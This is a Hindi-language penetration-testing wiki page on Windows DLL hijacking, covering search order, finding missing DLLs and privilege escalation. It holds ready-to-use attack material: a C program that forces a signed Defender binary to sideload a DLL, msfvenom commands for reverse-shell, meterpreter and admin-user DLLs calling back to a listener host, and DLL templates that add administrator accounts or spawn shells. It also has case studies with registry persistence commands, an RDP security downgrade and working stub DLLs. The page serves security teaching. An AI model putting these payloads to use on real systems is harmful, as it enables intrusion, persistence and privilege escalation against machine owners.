# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में एक भरोसेमंद एप्लिकेशन को एक malicious DLL लोड करने के लिए मॉनिपुलेट करना शामिल है। यह शब्द कई रणनीतियों को शामिल करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यतः code execution, persistence हासिल करने और कम आम तौर पर privilege escalation के लिए उपयोग किया जाता है। यहाँ focus भले ही escalation पर हो, लेकिन hijacking की विधि उद्देश्यों के बीच सामान्यतः समान रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके उपयोग किये जाते हैं, जिनकी प्रभावशीलता एप्लिकेशन की DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: एक असली DLL को एक malicious DLL से बदलना, वैकल्पिक रूप से मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: malicious DLL को legitimate DLL से पहले आने वाले search path में रखना, एप्लिकेशन की search pattern का फायदा उठाना।
3. **Phantom DLL Hijacking**: एक malicious DLL बनाना ताकि एप्लिकेशन उसे लोड करे, यह मानते हुए कि वह कोई आवश्यक DLL नहीं है।
4. **DLL Redirection**: `%PATH%` या `.exe.manifest` / `.exe.local` जैसी search parameters को बदलकर एप्लिकेशन को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में legitimate DLL को malicious DLL से बदलना, जो अक्सर DLL side-loading से जुड़ा तरीका है।
6. **Relative Path DLL Hijacking**: कॉपी किए गए application के साथ user-controlled डायरेक्टरी में malicious DLL रखना, जो Binary Proxy Execution तकनीकों जैसा है।

## मिसिंग DLLs ढूँढना

सिस्टम के अंदर मिसिंग DLLs खोजने का सबसे आम तरीका sysinternals का [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और निम्नलिखित 2 filters सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएं:

![](<../../../images/image (153).png>)

यदि आप सामान्य रूप से **missing dlls** खोज रहे हैं तो इसे कुछ **seconds** के लिए चलने दें।\
यदि आप किसी विशेष executable के अंदर **missing dll** खोज रहे हैं तो आपको एक और filter सेट करना चाहिए जैसे "Process Name" "contains" `<exec name>`, उसे execute करें, और events कैप्चर करना रोक दें।

## Missing DLLs का शोषण

privilege escalate करने के लिए, हमारी सबसे अच्छी संभावना यह है कि हम ऐसा **DLL लिख सकें जिसे एक privileged process लोड करने की कोशिश करेगा** किसी ऐसे **स्थान** में जहाँ उसे खोजा जाएगा। इसलिए, हम एक **DLL** उस **फ़ोल्डर** में लिख पाएँगे जहाँ वह **DLL** उस फ़ोल्डर से पहले खोजा जाता है जहाँ **original DLL** मौजूद है (ऐसा अजीब मामला), या हम किसी ऐसे फ़ोल्डर में लिख सकेंगे जहाँ DLL खोजा जाएगा और original **DLL किसी भी फ़ोल्डर में मौजूद नहीं होगा।**

### DLL Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **आप देख सकते हैं कि DLLs विशेष रूप से कैसे लोड होते हैं।**

Windows applications DLLs की तलाश एक निर्धारित क्रम वाले **pre-defined search paths** का पालन करके करती हैं। DLL hijacking तब होता है जब एक हानिकारक DLL को जानबूझकर इन डायरेक्टरीज़ में से किसी एक में रखा जाता है, ताकि वह असली DLL से पहले लोड हो जाए। इसको रोकने का एक उपाय यह है कि एप्लिकेशन जिन DLLs की जरूरत पड़ती है, उनके लिए absolute paths का उपयोग करे।

आप नीचे 32-bit सिस्टम पर **DLL search order** देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह **default** search order है जब **SafeDllSearchMode** enabled होता है। जब यह disabled होता है तो current directory दूसरी जगह आ जाता है। इस सुविधा को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर इसे 0 पर सेट करें (डिफ़ॉल्ट enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो खोज उस executable module की डायरेक्टरी से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **एक dll को केवल नाम की बजाय absolute path दिखाकर भी लोड किया जा सकता है**। उस स्थिति में वह dll **सिर्फ़ उसी path में खोजा जाएगा** (यदि उस dll की कोई dependencies हैं, तो उन्हें नाम द्वारा लोड किए जाने पर जैसा ही खोजा जाएगा)।

search order बदलने के और तरीके भी हैं लेकिन मैं उन्हें यहाँ समझाने वाला नहीं हूँ।

### RTL_USER_PROCESS_PARAMETERS.DllPath के जरिए sideloading मजबूर करना

एक उन्नत तरीका जो नए बनाए गए process के DLL search path को deterministic रूप से प्रभावित करता है, वह है RTL_USER_PROCESS_PARAMETERS में DllPath फ़ील्ड सेट करना जब process को ntdll की native APIs से बनाया जा रहा हो। यहाँ attacker-controlled directory प्रदान करके, एक target process जिसे कोई imported DLL नाम से resolve करती है (ना absolute path और ना safe loading flags का उपयोग) उसे उस डायरेक्टरी से malicious DLL लोड करने के लिए मजबूर किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएँ और एक custom DllPath दें जो आपके controlled folder की ओर इशारा करे (उदा., वह डायरेक्टरी जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ process बनाएं। जब target binary किसी DLL को नाम से resolve करेगा, तो loader resolution के दौरान इस supplied DllPath को देखेगा, जिससे विश्वसनीय sideloading सक्षम होगा भले ही malicious DLL target EXE के साथ colocate न हो।

नोट्स/सीमाएँ
- यह उस child process को प्रभावित करता है जो बनाया जा रहा है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को किसी DLL को नाम से import या LoadLibrary करना चाहिए (कोई absolute path नहीं और not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)।
- KnownDLLs और hardcoded absolute paths hijack नहीं किए जा सकते। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C उदाहरण (ntdll, wide strings, सरल त्रुटि हैंडलिंग):

<details>
<summary>पूर्ण C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के माध्यम से DLL sideloading मजबूर करना</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग का उदाहरण
- अपने DllPath डायरेक्टरी में एक दुर्भावनापूर्ण xmllite.dll रखें (जो आवश्यक functions export करे या असली DLL का proxy करे)।
- ऊपर बताई गई तकनीक का उपयोग करते हुए उस signed binary को लॉन्च करें जो नाम के आधार पर xmllite.dll को lookup करता है। loader दिए गए DllPath के माध्यम से import को resolve करता है और आपके DLL को sideload कर लेता है।

यह तकनीक वास्तविक वातावरण में multi-stage sideloading chains चलाने के लिए देखी गई है: एक initial launcher एक helper DLL drop करता है, जो फिर एक Microsoft-signed, hijackable binary को spawn करता है जिसकी custom DllPath attacker की DLL को एक staging directory से लोड करने के लिए मजबूर करती है।

#### Windows docs में dll search order के अपवाद

Windows दस्तावेज़ों में standard DLL search order के कुछ अपवादों का उल्लेख है:

- जब एक **DLL that shares its name with one already loaded in memory** मिलती है, तो सिस्टम सामान्य खोज bypass कर देता है। इसके बजाय, यह redirection और manifest की जाँच करता है इससे पहले कि वह पहले से memory में मौजूद DLL को default करे। **इस परिदृश्य में, सिस्टम DLL के लिए कोई search नहीं करता है**।
- ऐसे मामलों में जहाँ DLL को current Windows version के लिए **known DLL** के रूप में मान्यता प्राप्त है, सिस्टम अपने version of the known DLL का उपयोग करेगा, साथ ही उसके किसी भी dependent DLLs का भी, **search प्रक्रिया को छोड़ते हुए**। रजिस्ट्री कुंजी **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL के पास dependencies हैं**, तो इन dependent DLLs की खोज ऐसे की जाती है मानो उन्हें केवल उनके **module names** से संकेतित किया गया हो, चाहे प्रारंभिक DLL को full path के माध्यम से पहचाना गया हो या नहीं।

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **by default it's kind of weird to find a privileged executable missing a dll** और यह और भी अजीब है कि **more weird to have write permissions on a system path folder** (आप सामान्यतः ऐसा नहीं कर सकते)। लेकिन misconfigured environments में यह संभव है.  
यदि आप भाग्यशाली हैं और आप requirements पूरा कर लेते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही प्रोजेक्ट का **main goal of the project is bypass UAC** हो, वहाँ आपको उस Windows version के लिए एक **PoC** मिल सकता है जो Dll hijacking का है और जिसे आप उपयोग कर सकते हैं (संभावतः केवल उस फ़ोल्डर का path बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप किसी फ़ोल्डर में अपनी **permissions जांच** इस तरह कर सकते हैं:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के भीतर सभी फ़ोल्डरों की permissions की जांच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports को भी निम्न के साथ जाँच सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
यदि आप **System Path folder** में लिखने की permissions रखते हैं तो **abuse Dll Hijacking to escalate privileges** करने के लिए पूरी गाइड देखें:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### ऑटोमेटेड टूल्स

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि system PATH के अंदर किसी भी फ़ोल्डर में आपकी write permissions हैं या नहीं.\
इस vulnerability को खोजने के लिए अन्य दिलचस्प ऑटोमेटेड टूल्स **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आपको कोई exploitable परिदृश्य मिलता है तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक है कि आप **ऐसा dll बनाएँ जो उस executable द्वारा import किए जाने वाले कम से कम सभी functions को export करे**। वैसे भी, ध्यान दें कि Dll Hijacking उपयोगी होता है [Medium Integrity level से High **(bypassing UAC)** तक escalate करने के लिए](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM** तक](../index.html#from-high-integrity-to-system)। आप execution के लिए dll hijacking केंद्रित इस अध्ययन में **वैध dll कैसे बनाएं** का एक उदाहरण पा सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

बुनियादी तौर पर एक **Dll proxy** ऐसा Dll होता है जो लोड होने पर आपका malicious code execute कर सके, और साथ ही वास्तविक लाइब्रेरी को कॉल्स relay करके अपेक्षित रूप से **expose** और **work** भी करे।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) जैसे टूल के साथ आप वास्तव में **किसी executable को संकेत कर सकते हैं और वह लाइब्रेरी चुन सकते हैं** जिसे आप proxify करना चाहते हैं और **एक proxified dll generate कर सकते हैं** या **Dll निर्दिष्ट करके** और **एक proxified dll generate कर सकते हैं**।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएँ (x86 — मैंने x64 संस्करण नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में आपने जो Dll compile किया है उसे उन functions को **export several functions** करना होगा जिन्हें victim process द्वारा लोड किया जाएगा। यदि ये functions मौजूद नहीं हैं तो **binary won't be able to load** उन्हें और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण (उपयोगकर्ता निर्माण के साथ)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>थ्रेड एंट्री वाले वैकल्पिक C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe स्टार्ट पर अभी भी एक अनुमानित, भाषा-विशिष्ट localization DLL को जांचता है, जिसे hijack करके arbitrary code execution और persistence प्राप्त की जा सकती है।

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore path पर एक writable attacker-controlled DLL मौजूद है, तो वह लोड होती है और `DllMain(DLL_PROCESS_ATTACH)` निष्पादित होता है। किसी एक्सपोर्ट की आवश्यकता नहीं है।

Discovery with Procmon
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए path के लोड प्रयास को देखें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- चुप रहने के लिए: एक naive hijack UI को बोलाए/हाइलाइट करेगा। attach करते समय Narrator के threads enumerate करें, मुख्य thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपनी खुद की thread में जारी रखें। पूरा कोड देखने के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए के साथ, Narrator शुरू करने पर planted DLL लोड हो जाती है। secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ।

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- होस्ट पर RDP करें, logon screen पर CTRL+WIN+ENTER दबाकर Narrator लॉन्च करें; आपकी DLL secure desktop पर SYSTEM के रूप में चलती है।
- RDP session बंद होते ही execution रुक जाता है — तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator) क्लोन कर सकते हैं, उसे किसी arbitrary binary/DLL की ओर इशारा करने के लिए edit करें, import करें, फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के तहत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` के तहत लिखना और HKLM मान बदलना admin rights की आवश्यकता होती है।
- सारा payload लॉजिक `DLL_PROCESS_ATTACH` में हो सकता है; किसी exports की आवश्यकता नहीं है।

## केस स्टडी: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह केस Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** को दिखाता है, जिसे **CVE-2025-1729** के रूप में ट्रैक किया गया है।

### भेद्यता विवरण

- **Component**: `TPQMAssistant.exe` स्थित है `C:\ProgramData\Lenovo\TPQM\Assistant\` पर।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोजाना 9:30 AM पर लॉग-ऑन उपयोगकर्ता के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable है, जिससे local users arbitrary files रख सकते हैं।
- **DLL Search Behavior**: पहले अपने working directory से `hostfxr.dll` लोड करने की कोशिश करता है और अगर गायब है तो "NAME NOT FOUND" लॉग करता है, जो local directory search precedence को दर्शाता है।

### Exploit Implementation

एक attacker उसी डायरेक्टरी में एक malicious `hostfxr.dll` stub रख सकता है, missing DLL का फायदा उठा कर user's context में code execution हासिल करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. मानक उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. मौजूदा उपयोगकर्ता के संदर्भ में शेड्यूल किया गया टास्क सुबह 9:30 बजे चलने का इंतज़ार करें।
3. यदि टास्क के निष्पादन के समय कोई प्रशासक लॉग इन है, तो दुष्ट DLL प्रशासक के session में medium integrity पर चलेगा।
4. standard UAC bypass techniques की शृंखला का उपयोग करके medium integrity से SYSTEM privileges तक उन्नत करें।

## केस स्टडी: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors अक्सर MSI-based droppers को DLL side-loading के साथ जोड़ते हैं ताकि एक trusted, signed process के तहत payloads निष्पादित किए जा सकें।

Chain overview
- यूजर MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (उदा., LaunchApplication या एक VBScript action), जो embedded resources से अगले चरण को पुनर्निर्मित करता है।
- Dropper एक legitimate, signed EXE और एक दुष्ट DLL को उसी डायरेक्टरी में लिखता है (उदाहरण जोड़ी: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू होता है, तो Windows DLL search order working directory से पहले wsc.dll लोड करता है, जिससे attacker का कोड signed parent के तहत निष्पादित होता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे entries खोजें जो executables या VBScript चलाते हों। संदिग्ध उदाहरण पैटर्न: background में embedded file को चलाने वाला LaunchApplication।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence और Binary tables की जाँच करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- ऐसे कई छोटे fragments ढूँढें जिन्हें VBScript CustomAction द्वारा concatenated और decrypted किया जाता है। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- इन दोनों फाइलों को एक ही फ़ोल्डर में रखें:
- wsc_proxy.exe: legitimate signed host (Avast). यह प्रक्रिया अपनी डायरेक्टरी से नाम द्वारा wsc.dll लोड करने का प्रयास करती है।
- wsc.dll: attacker DLL. यदि किसी specific exports की आवश्यकता नहीं है, तो DllMain पर्याप्त होगा; अन्यथा, एक proxy DLL बनाएं और required exports को genuine library को forward करें जबकि payload को DllMain में रन करें।
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export requirements के लिए, एक proxying framework (e.g., DLLirant/Spartacus) का उपयोग करके एक forwarding DLL जनरेट करें जो आपका payload भी execute करे।

- यह तकनीक host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack असफल हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary तथा export set का चयन करते समय इन्हें ध्यान में रखना चाहिए।

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
